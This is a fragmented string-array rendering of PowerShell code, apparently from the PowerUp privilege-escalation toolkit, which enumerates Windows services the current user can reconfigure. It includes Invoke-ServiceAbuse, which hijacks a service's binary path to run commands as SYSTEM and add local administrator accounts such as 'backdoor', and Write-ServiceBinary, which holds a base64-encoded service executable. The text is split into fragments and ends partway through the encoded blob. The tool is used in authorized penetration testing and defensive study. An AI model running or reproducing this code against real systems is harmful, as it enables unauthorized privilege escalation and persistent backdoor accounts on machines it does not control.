    Get-WMI','Object -Class ','win32_service ','| Where-Object',' {$_ -and $_.p','athname} | For','Each-Object {
','
        $Serv','iceName = $_.n','ame
        $S','ervicePath = $','_.pathname
   ','     $ServiceS','tartName = $_.','startname

   ','     $ServiceP','ath | Get-Modi','fiablePath | F','orEach-Object ','{
            ','$CanRestart = ','Test-ServiceDa','clPermission -','PermissionSet ','''Restart'' -Nam','e $ServiceName','
            $','Out = New-Obje','ct PSObject
  ','          $Out',' | Add-Member ','Noteproperty ''','ServiceName'' $','ServiceName
  ','          $Out',' | Add-Member ','Noteproperty ''','Path'' $Service','Path
         ','   $Out | Add-','Member Notepro','perty ''Modifia','bleFile'' $_.Mo','difiablePath
 ','           $Ou','t | Add-Member',' Noteproperty ','''ModifiableFil','ePermissions'' ','$_.Permissions','
            $','Out | Add-Memb','er Notepropert','y ''ModifiableF','ileIdentityRef','erence'' $_.Ide','ntityReference','
            $','Out | Add-Memb','er Notepropert','y ''StartName'' ','$ServiceStartN','ame
          ','  $Out | Add-M','ember Noteprop','erty ''AbuseFun','ction'' "Instal','l-ServiceBinar','y -Name ''$Serv','iceName''"
    ','        $Out |',' Add-Member No','teproperty ''Ca','nRestart'' ([Bo','ol]$CanRestart',')
            ','$Out | Add-Mem','ber Aliasprope','rty Name Servi','ceName
       ','     $Out.PSOb','ject.TypeNames','.Insert(0, ''Po','werUp.Modifiab','leServiceFile''',')
            ','$Out
        }','
    }
}


fun','ction Get-Modi','fiableService ','{
<#
.SYNOPSIS','

Enumerates a','ll services an','d returns serv','ices for which',' the current u','ser can modify',' the binPath.
','
Author: Will ','Schroeder (@ha','rmj0y)  
Licen','se: BSD 3-Clau','se  
Required ','Dependencies: ','Test-ServiceDa','clPermission, ','Get-ServiceDet','ail  

.DESCRI','PTION

Enumera','tes all servic','es using Get-S','ervice and use','s Test-Service','DaclPermission',' to test if
th','e current user',' has rights to',' change the se','rvice configur','ation.

.EXAMP','LE

Get-Modifi','ableService

G','et a set of po','tentially expl','oitable servic','es.

.OUTPUTS
','
PowerUp.Modif','iablePath
#>

','    [Diagnosti','cs.CodeAnalysi','s.SuppressMess','ageAttribute(''','PSShouldProces','s'', '''')]
    [','OutputType(''Po','werUp.Modifiab','leService'')]
 ','   [CmdletBind','ing()]
    Par','am()

    Get-','Service | Test','-ServiceDaclPe','rmission -Perm','issionSet ''Cha','ngeConfig'' | F','orEach-Object ','{
        $Ser','viceDetails = ','$_ | Get-Servi','ceDetail
     ','   $CanRestart',' = $_ | Test-S','erviceDaclPerm','ission -Permis','sionSet ''Resta','rt''
        $O','ut = New-Objec','t PSObject
   ','     $Out | Ad','d-Member Notep','roperty ''Servi','ceName'' $Servi','ceDetails.name','
        $Out ','| Add-Member N','oteproperty ''P','ath'' $ServiceD','etails.pathnam','e
        $Out',' | Add-Member ','Noteproperty ''','StartName'' $Se','rviceDetails.s','tartname
     ','   $Out | Add-','Member Notepro','perty ''AbuseFu','nction'' "Invok','e-ServiceAbuse',' -Name ''$($Ser','viceDetails.na','me)''"
        ','$Out | Add-Mem','ber Noteproper','ty ''CanRestart',''' ([Bool]$CanR','estart)
      ','  $Out | Add-M','ember Aliaspro','perty Name Ser','viceName
     ','   $Out.PSObje','ct.TypeNames.I','nsert(0, ''Powe','rUp.Modifiable','Service'')
    ','    $Out
    }','
}


function ','Get-ServiceDet','ail {
<#
.SYNO','PSIS

Returns ','detailed infor','mation about a',' specified ser','vice by queryi','ng the
WMI win','32_service cla','ss for the spe','cified service',' name.

Author',': Will Schroed','er (@harmj0y) ',' 
License: BSD',' 3-Clause  
Re','quired Depende','ncies: None  
','
.DESCRIPTION
','
Takes an arra','y of one or mo','re service Nam','es or ServiceP','rocess.Service','Controller obj','edts on
the pi','peline object ','returned by Ge','t-Service, ext','racts out the ','service name, ','queries the
WM','I win32_servic','e class for th','e specified se','rvice for deta','ils like binPa','th, and output','s
everything.
','
.PARAMETER Na','me

An array o','f one or more ','service names ','to query infor','mation for.

.','EXAMPLE

Get-S','erviceDetail -','Name VulnSVC

','Gets detailed ','information ab','out the ''VulnS','VC'' service.

','.EXAMPLE

Get-','Service VulnSV','C | Get-Servic','eDetail

Gets ','detailed infor','mation about t','he ''VulnSVC'' s','ervice.

.OUTP','UTS

System.Ma','nagement.Manag','ementObject
#>','

    [OutputT','ype(''PowerUp.M','odifiableServi','ce'')]
    [Cmd','letBinding()]
','    Param(
   ','     [Paramete','r(Position = 0',', Mandatory = ','$True, ValueFr','omPipeline = $','True, ValueFro','mPipelineByPro','pertyName = $T','rue)]
        ','[Alias(''Servic','eName'')]
     ','   [String[]]
','        [Valid','ateNotNullOrEm','pty()]
       ',' $Name
    )

','    PROCESS {
','        ForEac','h($IndividualS','ervice in $Nam','e) {
         ','   $TargetServ','ice = Get-Serv','ice -Name $Ind','ividualService',' -ErrorAction ','Stop
         ','   if ($Target','Service) {
   ','             G','et-WmiObject -','Class win32_se','rvice -Filter ','"Name=''$($Targ','etService.Name',')''" | Where-Ob','ject {$_} | Fo','rEach-Object {','
             ','       try {
 ','              ','         $_
  ','              ','    }
        ','            ca','tch {
        ','              ','  Write-Verbos','e "Error: $_"
','              ','      }
      ','          }
  ','          }
  ','      }
    }
','}


##########','##############','##############','##############','####
#
# Servi','ce abuse
#
###','##############','##############','##############','###########

f','unction Invoke','-ServiceAbuse ','{
<#
.SYNOPSIS','

Abuses a fun','ction the curr','ent user has c','onfiguration r','ights on in or','der
to add a l','ocal administr','ator or execut','e a custom com','mand.

Author:',' Will Schroede','r (@harmj0y)  ','
License: BSD ','3-Clause  
Req','uired Dependen','cies: Get-Serv','iceDetail, Set','-ServiceBinary','Path  

.DESCR','IPTION

Takes ','a service Name',' or a ServiceP','rocess.Service','Controller on ','the pipeline t','hat the curren','t
user has con','figuration mod','ification righ','ts on and exec','utes a series ','of automated a','ctions to
exec','ute commands a','s SYSTEM. Firs','t, the service',' is enabled if',' it was set as',' disabled and ','the
original s','ervice binary ','path and confi','guration state',' are preserved','. Then the ser','vice is stoppe','d
and the Set-','ServiceBinaryP','ath function i','s used to set ','the binary (bi','nPath) for the',' service to a
','series of comm','ands, the serv','ice is started',', stopped, and',' the next comm','and is configu','red. After
com','pletion, the o','riginal servic','e configuratio','n is restored ','and a custom o','bject is retur','ned
that captu','res the servic','e abused and c','ommands run.

','.PARAMETER Nam','e

An array of',' one or more s','ervice names t','o abuse.

.PAR','AMETER UserNam','e

The [domain','\]username to ','add. If not gi','ven, it defaul','ts to "john".
','Domain users a','re not created',', only added t','o the specifie','d localgroup.
','
.PARAMETER Pa','ssword

The pa','ssword to set ','for the added ','user. If not g','iven, it defau','lts to "Passwo','rd123!"

.PARA','METER LocalGro','up

Local grou','p name to add ','the user to (d','efault of ''Adm','inistrators'').','

.PARAMETER C','redential

A [','Management.Aut','omation.PSCred','ential] object',' specifying th','e user/passwor','d to add.

.PA','RAMETER Comman','d

Custom comm','and to execute',' instead of us','er creation.

','.PARAMETER For','ce

Switch. Fo','rce service st','opping, even i','f other servic','es are depende','nt.

.EXAMPLE
','
Invoke-Servic','eAbuse -Name V','ulnSVC

Abuses',' service ''Vuln','SVC'' to add a ','localuser "joh','n" with passwo','rd
"Password12','3! to the  mac','hine and local',' administrator',' group

.EXAMP','LE

Get-Servic','e VulnSVC | In','voke-ServiceAb','use

Abuses se','rvice ''VulnSVC',''' to add a loc','aluser "john" ','with password
','"Password123! ','to the  machin','e and local ad','ministrator gr','oup

.EXAMPLE
','
Invoke-Servic','eAbuse -Name V','ulnSVC -UserNa','me "TESTLAB\jo','hn"

Abuses se','rvice ''VulnSVC',''' to add a the',' domain user T','ESTLAB\john to',' the
local adm','inisrtators gr','oup.

.EXAMPLE','

Invoke-Servi','ceAbuse -Name ','VulnSVC -UserN','ame backdoor -','Password passw','ord -LocalGrou','p "Power Users','"

Abuses serv','ice ''VulnSVC'' ','to add a local','user "backdoor','" with passwor','d
"password" t','o the  machine',' and local "Po','wer Users" gro','up

.EXAMPLE

','Invoke-Service','Abuse -Name Vu','lnSVC -Command',' "net ..."

Ab','uses service ''','VulnSVC'' to ex','ecute a custom',' command.

.OU','TPUTS

PowerUp','.AbusedService','
#>

    [Diag','nostics.CodeAn','alysis.Suppres','sMessageAttrib','ute(''PSShouldP','rocess'', '''')]
','    [Diagnosti','cs.CodeAnalysi','s.SuppressMess','ageAttribute(''','PSAvoidUsingUs','erNameAndPassW','ordParams'', ''''',')]
    [Diagno','stics.CodeAnal','ysis.SuppressM','essageAttribut','e(''PSAvoidUsin','gPlainTextForP','assword'', '''')]','
    [OutputTy','pe(''PowerUp.Ab','usedService'')]','
    [CmdletBi','nding()]
    P','aram(
        ','[Parameter(Pos','ition = 0, Man','datory = $True',', ValueFromPip','eline = $True,',' ValueFromPipe','lineByProperty','Name = $True)]','
        [Alia','s(''ServiceName',''')]
        [S','tring[]]
     ','   [ValidateNo','tNullOrEmpty()',']
        $Nam','e,

        [V','alidateNotNull','OrEmpty()]
   ','     [String]
','        $UserN','ame = ''john'',
','
        [Vali','dateNotNullOrE','mpty()]
      ','  [String]
   ','     $Password',' = ''Password12','3!'',

        ','[ValidateNotNu','llOrEmpty()]
 ','       [String',']
        $Loc','alGroup = ''Adm','inistrators'',
','
        [Mana','gement.Automat','ion.PSCredenti','al]
        [M','anagement.Auto','mation.Credent','ialAttribute()',']
        $Cre','dential = [Man','agement.Automa','tion.PSCredent','ial]::Empty,

','        [Strin','g]
        [Va','lidateNotNullO','rEmpty()]
    ','    $Command,
','
        [Swit','ch]
        $F','orce
    )

  ','  BEGIN {

   ','     if ($PSBo','undParameters[','''Command'']) {
','            $S','erviceCommands',' = @($Command)','
        }

  ','      else {
 ','           if ','($PSBoundParam','eters[''Credent','ial'']) {
     ','           $Us','erNameToAdd = ','$Credential.Us','erName
       ','         $Pass','wordToAdd = $C','redential.GetN','etworkCredenti','al().Password
','            }
','            el','se {
         ','       $UserNa','meToAdd = $Use','rName
        ','        $Passw','ordToAdd = $Pa','ssword
       ','     }

      ','      if ($Use','rNameToAdd.Con','tains(''\'')) {
','              ','  # only addin','g a domain use','r to the local',' group, no use','r creation
   ','             $','ServiceCommand','s = @("net loc','algroup $Local','Group $UserNam','eToAdd /add")
','            }
','            el','se {
         ','       # creat','e a local user',' and add it to',' the local spe','cified group
 ','              ',' $ServiceComma','nds = @("net u','ser $UserNameT','oAdd $Password','ToAdd /add", "','net localgroup',' $LocalGroup $','UserNameToAdd ','/add")
       ','     }
       ',' }
    }

    ','PROCESS {

   ','     ForEach($','IndividualServ','ice in $Name) ','{

           ',' $TargetServic','e = Get-Servic','e -Name $Indiv','idualService -','ErrorAction St','op
           ',' $ServiceDetai','ls = $TargetSe','rvice | Get-Se','rviceDetail

 ','           $Re','storeDisabled ','= $False
     ','       if ($Se','rviceDetails.S','tartMode -matc','h ''Disabled'') ','{
            ','    Write-Verb','ose "Service ''','$(ServiceDetai','ls.Name)'' disa','bled, enabling','..."
         ','       $Target','Service | Set-','Service -Start','upType Manual ','-ErrorAction S','top
          ','      $Restore','Disabled = $Tr','ue
           ',' }

          ','  $OriginalSer','vicePath = $Se','rviceDetails.P','athName
      ','      $Origina','lServiceState ','= $ServiceDeta','ils.State

   ','         Write','-Verbose "Serv','ice ''$($Target','Service.Name)''',' original path',': ''$OriginalSe','rvicePath''"
  ','          Writ','e-Verbose "Ser','vice ''$($Targe','tService.Name)',''' original sta','te: ''$Original','ServiceState''"','

            ','ForEach($Servi','ceCommand in $','ServiceCommand','s) {

        ','        if ($P','SBoundParamete','rs[''Force'']) {','
             ','       $Target','Service | Stop','-Service -Forc','e -ErrorAction',' Stop
        ','        }
    ','            el','se {
         ','           $Ta','rgetService | ','Stop-Service -','ErrorAction St','op
           ','     }

      ','          Writ','e-Verbose "Exe','cuting command',' ''$ServiceComm','and''"
        ','        $Succe','ss = $TargetSe','rvice | Set-Se','rviceBinaryPat','h -Path "$Serv','iceCommand"

 ','              ',' if (-not $Suc','cess) {
      ','              ','throw "Error r','econfiguring t','he binary path',' for $($Target','Service.Name)"','
             ','   }

        ','        $Targe','tService | Sta','rt-Service -Er','rorAction Sile','ntlyContinue
 ','              ',' Start-Sleep -','Seconds 2
    ','        }

   ','         if ($','PSBoundParamet','ers[''Force'']) ','{
            ','    $TargetSer','vice | Stop-Se','rvice -Force -','ErrorAction St','op
           ',' }
           ',' else {
      ','          $Tar','getService | S','top-Service -E','rrorAction Sto','p
            ','}

           ',' Write-Verbose',' "Restoring or','iginal path to',' service ''$($T','argetService.N','ame)''"
       ','     Start-Sle','ep -Seconds 1
','            $S','uccess = $Targ','etService | Se','t-ServiceBinar','yPath -Path "$','OriginalServic','ePath"

      ','      if (-not',' $Success) {
 ','              ',' throw "Error ','restoring the ','original binPa','th for $($Targ','etService.Name',')"
           ',' }

          ','  # try to res','tore the servi','ce to whatever',' the service''s',' original stat','e was
        ','    if ($Resto','reDisabled) {
','              ','  Write-Verbos','e "Re-disablin','g service ''$($','TargetService.','Name)''"
      ','          $Tar','getService | S','et-Service -St','artupType Disa','bled -ErrorAct','ion Stop
     ','       }
     ','       elseif ','($OriginalServ','iceState -eq "','Paused") {
   ','             W','rite-Verbose "','Starting and t','hen pausing se','rvice ''$($Targ','etService.Name',')''"
          ','      $TargetS','ervice | Start','-Service
     ','           Sta','rt-Sleep -Seco','nds 1
        ','        $Targe','tService | Set','-Service -Stat','us Paused -Err','orAction Stop
','            }
','            el','seif ($Origina','lServiceState ','-eq "Stopped")',' {
           ','     Write-Ver','bose "Leaving ','service ''$($Ta','rgetService.Na','me)'' in stoppe','d state"
     ','       }
     ','       else {
','              ','  Write-Verbos','e "Restarting ','''$($TargetServ','ice.Name)''"
  ','              ','$TargetService',' | Start-Servi','ce
           ',' }

          ','  $Out = New-O','bject PSObject','
            $','Out | Add-Memb','er Notepropert','y ''ServiceAbus','ed'' $TargetSer','vice.Name
    ','        $Out |',' Add-Member No','teproperty ''Co','mmand'' $($Serv','iceCommands -j','oin '' && '')
  ','          $Out','.PSObject.Type','Names.Insert(0',', ''PowerUp.Abu','sedService'')
 ','           $Ou','t
        }
  ','  }
}


functi','on Write-Servi','ceBinary {
<#
','.SYNOPSIS

Pat','ches in the sp','ecified comman','d to a pre-com','piled C# servi','ce executable ','and
writes the',' binary out to',' the specified',' ServicePath l','ocation.

Auth','or: Will Schro','eder (@harmj0y',')  
License: B','SD 3-Clause  
','Required Depen','dencies: None ',' 

.DESCRIPTIO','N

Takes a pre','-compiled C# s','ervice binary ','and patches in',' the appropria','te commands ne','eded
for servi','ce abuse. If a',' -UserName/-Pa','ssword or -Cre','dential is spe','cified, the co','mmand
patched ','in creates a l','ocal user and ','adds them to t','he specified -','LocalGroup, ot','herwise
the sp','ecified -Comma','nd is patched ','in. The binary',' is then writt','en out to the ','specified
-Ser','vicePath. Eith','er -Name must ','be specified f','or the service',', or a proper ','object from
Ge','t-Service must',' be passed on ','the pipeline i','n order to pat','ch in the appr','opriate servic','e
name the bin','ary will be ru','nning under.

','.PARAMETER Nam','e

The service',' name the EXE ','will be runnin','g under.

.PAR','AMETER UserNam','e

The [domain','\]username to ','add. If not gi','ven, it defaul','ts to "john".
','Domain users a','re not created',', only added t','o the specifie','d localgroup.
','
.PARAMETER Pa','ssword

The pa','ssword to set ','for the added ','user. If not g','iven, it defau','lts to "Passwo','rd123!"

.PARA','METER LocalGro','up

Local grou','p name to add ','the user to (d','efault of ''Adm','inistrators'').','

.PARAMETER C','redential

A [','Management.Aut','omation.PSCred','ential] object',' specifying th','e user/passwor','d to add.

.PA','RAMETER Comman','d

Custom comm','and to execute',' instead of us','er creation.

','.PARAMETER Pat','h

Path to wri','te the binary ','out to, defaul','ts to ''service','.exe'' in the l','ocal directory','.

.EXAMPLE

W','rite-ServiceBi','nary -Name Vul','nSVC

Writes a',' service binar','y to service.e','xe in the loca','l directory fo','r VulnSVC that','
adds a local ','Administrator ','(john/Password','123!).

.EXAMP','LE

Get-Servic','e VulnSVC | Wr','ite-ServiceBin','ary

Writes a ','service binary',' to service.ex','e in the local',' directory for',' VulnSVC that
','adds a local A','dministrator (','john/Password1','23!).

.EXAMPL','E

Write-Servi','ceBinary -Name',' VulnSVC -User','Name ''TESTLAB\','john''

Writes ','a service bina','ry to service.','exe in the loc','al directory f','or VulnSVC tha','t adds
TESTLAB','\john to the A','dministrators ','local group.

','.EXAMPLE

Writ','e-ServiceBinar','y -Name VulnSV','C -UserName ba','ckdoor -Passwo','rd Password123','!

Writes a se','rvice binary t','o service.exe ','in the local d','irectory for V','ulnSVC that
ad','ds a local Adm','inistrator (ba','ckdoor/Passwor','d123!).

.EXAM','PLE

Write-Ser','viceBinary -Na','me VulnSVC -Co','mmand "net ...','"

Writes a se','rvice binary t','o service.exe ','in the local d','irectory for V','ulnSVC that
ex','ecutes a custo','m command.

.O','UTPUTS

PowerU','p.ServiceBinar','y
#>

    [Dia','gnostics.CodeA','nalysis.Suppre','ssMessageAttri','bute(''PSShould','Process'', '''')]','
    [Diagnost','ics.CodeAnalys','is.SuppressMes','sageAttribute(','''PSAvoidUsingU','serNameAndPass','WordParams'', ''',''')]
    [Diagn','ostics.CodeAna','lysis.Suppress','MessageAttribu','te(''PSAvoidUsi','ngPlainTextFor','Password'', '''')',']
    [OutputT','ype(''PowerUp.S','erviceBinary'')',']
    [CmdletB','inding()]
    ','Param(
       ',' [Parameter(Po','sition = 0, Ma','ndatory = $Tru','e, ValueFromPi','peline = $True',', ValueFromPip','elineByPropert','yName = $True)',']
        [Ali','as(''ServiceNam','e'')]
        [','String]
      ','  [ValidateNot','NullOrEmpty()]','
        $Name',',

        [St','ring]
        ','$UserName = ''j','ohn'',

       ',' [String]
    ','    $Password ','= ''Password123','!'',

        [','String]
      ','  $LocalGroup ','= ''Administrat','ors'',

       ',' [Management.A','utomation.PSCr','edential]
    ','    [Managemen','t.Automation.C','redentialAttri','bute()]
      ','  $Credential ','= [Management.','Automation.PSC','redential]::Em','pty,

        ','[String]
     ','   [ValidateNo','tNullOrEmpty()',']
        $Com','mand,

       ',' [String]
    ','    $Path = "$','(Convert-Path ','.)\service.exe','"
    )

    B','EGIN {
       ',' # the raw unp','atched service',' binary
      ','  $B64Binary =',' "TVqQAAMAAAAE','AAAA//8AALgAAA','AAAAAAQAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAgA','AAAA4fug4AtAnN','IbgBTM0hVGhpcy','Bwcm9ncmFtIGNh','bm5vdCBiZSBydW','4gaW4gRE9TIG1v','ZGUuDQ0KJAAAAA','AAAABQRQAATAED','ANM1P1UAAAAAAA','AAAOAAAgELAQsA','AEwAAAAIAAAAAA','AAHmoAAAAgAAAA','gAAAAABAAAAgAA','AAAgAABAAAAAAA','AAAEAAAAAAAAAA','DAAAAAAgAAAAAA','AAIAQIUAABAAAB','AAAAAAEAAAEAAA','AAAAABAAAAAAAA','AAAAAAAMhpAABT','AAAAAIAAADAFAA','AAAAAAAAAAAAAA','AAAAAAAAAKAAAA','wAAABQaQAAHAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','IAAACAAAAAAAAA','AAAAAACCAAAEgA','AAAAAAAAAAAAAC','50ZXh0AAAAJEoA','AAAgAAAATAAAAA','IAAAAAAAAAAAAA','AAAAACAAAGAucn','NyYwAAADAFAAAA','gAAAAAYAAABOAA','AAAAAAAAAAAAAA','AABAAABALnJlbG','9jAAAMAAAAAKAA','AAACAAAAVAAAAA','AAAAAAAAAAAAAA','QAAAQgAAAAAAAA','AAAAAAAAAAAAAA','agAAAAAAAEgAAA','ACAAUA+CAAAFhI','AAADAAAABgAABg','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAHoDLBMC','ewEAAAQsCwJ7AQ','AABG8RAAAKAgMo','EgAACipyAnMTAA','AKfQEAAAQCcgEA','AHBvFAAACigVAA','AKKjYCKBYAAAoC','KAIAAAYqAAATMA','IAKAAAAAEAABFy','RwAAcApyQEAAcA','ZvFAAACigXAAAK','JiDQBwAAKBgAAA','oWKBkAAAoqBioA','ABMwAwAYAAAAAg','AAEReNAQAAAQsH','FnMDAAAGogcKBi','gaAAAKKkJTSkIB','AAEAAAAAAAwAAA','B2NC4wLjMwMzE5','AAAAAAUAbAAAAM','QCAAAjfgAAMAMA','AHADAAAjU3RyaW','5ncwAAAACgBgAA','UEAAACNVUwDwRg','AAEAAAACNHVUlE','AAAAAEcAAFgBAA','AjQmxvYgAAAAAA','AAACAAABVxUCAA','kAAAAA+iUzABYA','AAEAAAAaAAAAAw','AAAAEAAAAGAAAA','AgAAABoAAAAOAA','AAAgAAAAEAAAAD','AAAAAAAKAAEAAA','AAAAYARQAvAAoA','YQBaAA4AfgBoAA','oA6wDZAAoAAgHZ','AAoAHwHZAAoAPg','HZAAoAVwHZAAoA','cAHZAAoAiwHZAA','oApgHZAAoA3gG/','AQoA8gG/AQoAAA','LZAAoAGQLZAAoA','UAI2AgoAfAJpAk','cAkAIAAAoAvwKf','AgoA3wKfAgoA/Q','JaAA4ACQNoAAoA','EwNaAA4ALwNpAg','oATgM9AwoAWwNa','AAAAAAABAAAAAA','ABAAEAAQAQABYA','HwAFAAEAAQCAAR','AAJwAfAAkAAgAG','AAEAiQATAFAgAA','AAAMQAlAAXAAEA','byAAAAAAgQCcAB','wAAgCMIAAAAACG','GLAAHAACAJwgAA','AAAMQAtgAgAAIA','0CAAAAAAxAC+AB','wAAwDUIAAAAACR','AMUAJgADAAAAAQ','DKAAAAAQDUACEA','sAAqACkAsAAqAD','EAsAAqADkAsAAq','AEEAsAAqAEkAsA','AqAFEAsAAqAFkA','sAAqAGEAsAAXAG','kAsAAqAHEAsAAq','AHkAsAAqAIEAsA','AqAIkAsAAvAJkA','sAA1AKEAsAAcAK','kAlAAcAAkAlAAX','ALEAsAAcALkAGg','M6AAkAHwMqAAkA','sAAcAMEANwM+AM','kAVQNFANEAZwNF','AAkAbANOAC4ACw','BeAC4AEwBrAC4A','GwBrAC4AIwBrAC','4AKwBeAC4AMwBx','AC4AOwBrAC4ASw','BrAC4AUwCJAC4A','YwCzAC4AawDAAC','4AcwAmAS4AewAv','AS4AgwA4AUoAVQ','AEgAAAAQAAAAAA','AAAAAAAAAAAfAA','AABAAAAAAAAAAA','AAAAAQAvAAAAAA','AEAAAAAAAAAAAA','AAAKAFEAAAAAAA','QAAAAAAAAAAAAA','AAoAWgAAAAAAAA','AAAAA8TW9kdWxl','PgBVcGRhdGVyLm','V4ZQBTZXJ2aWNl','MQBVcGRhdGVyAF','Byb2dyYW0AU3lz','dGVtLlNlcnZpY2','VQcm9jZXNzAFNl','cnZpY2VCYXNlAG','1zY29ybGliAFN5','c3RlbQBPYmplY3','QAU3lzdGVtLkNv','bXBvbmVudE1vZG','VsAElDb250YWlu','ZXIAY29tcG9uZW','50cwBEaXNwb3Nl','AEluaXRpYWxpem','VDb21wb25lbnQA','LmN0b3IAT25TdG','FydABPblN0b3AA','TWFpbgBkaXNwb3','NpbmcAYXJncwBT','eXN0ZW0uUmVmbG','VjdGlvbgBBc3Nl','bWJseVRpdGxlQX','R0cmlidXRlAEFz','c2VtYmx5RGVzY3','JpcHRpb25BdHRy','aWJ1dGUAQXNzZW','1ibHlDb25maWd1','cmF0aW9uQXR0cm','lidXRlAEFzc2Vt','Ymx5Q29tcGFueU','F0dHJpYnV0ZQBB','c3NlbWJseVByb2','R1Y3RBdHRyaWJ1','dGUAQXNzZW1ibH','lDb3B5cmlnaHRB','dHRyaWJ1dGUAQX','NzZW1ibHlUcmFk','ZW1hcmtBdHRyaW','J1dGUAQXNzZW1i','bHlDdWx0dXJlQX','R0cmlidXRlAFN5','c3RlbS5SdW50aW','1lLkludGVyb3BT','ZXJ2aWNlcwBDb2','1WaXNpYmxlQXR0','cmlidXRlAEd1aW','RBdHRyaWJ1dGUA','QXNzZW1ibHlWZX','JzaW9uQXR0cmli','dXRlAEFzc2VtYm','x5RmlsZVZlcnNp','b25BdHRyaWJ1dG','UAU3lzdGVtLlJ1','bnRpbWUuVmVyc2','lvbmluZwBUYXJn','ZXRGcmFtZXdvcm','tBdHRyaWJ1dGUA','U3lzdGVtLkRpYW','dub3N0aWNzAERl','YnVnZ2FibGVBdH','RyaWJ1dGUARGVi','dWdnaW5nTW9kZX','MAU3lzdGVtLlJ1','bnRpbWUuQ29tcG','lsZXJTZXJ2aWNl','cwBDb21waWxhdG','lvblJlbGF4YXRp','b25zQXR0cmlidX','RlAFJ1bnRpbWVD','b21wYXRpYmlsaX','R5QXR0cmlidXRl','AElEaXNwb3NhYm','xlAENvbnRhaW5l','cgBTdHJpbmcAVH','JpbQBzZXRfU2Vy','dmljZU5hbWUAUH','JvY2VzcwBTdGFy','dABTeXN0ZW0uVG','hyZWFkaW5nAFRo','cmVhZABTbGVlcA','BFbnZpcm9ubWVu','dABFeGl0AFJ1bg','AARUEAQQBBACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAAL/3','LwBDACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAAIA','AgACAAIAAgACAA','IAAgACAAIAAgAC','AAIAAgACAAIAAg','ACAAIAAgACAA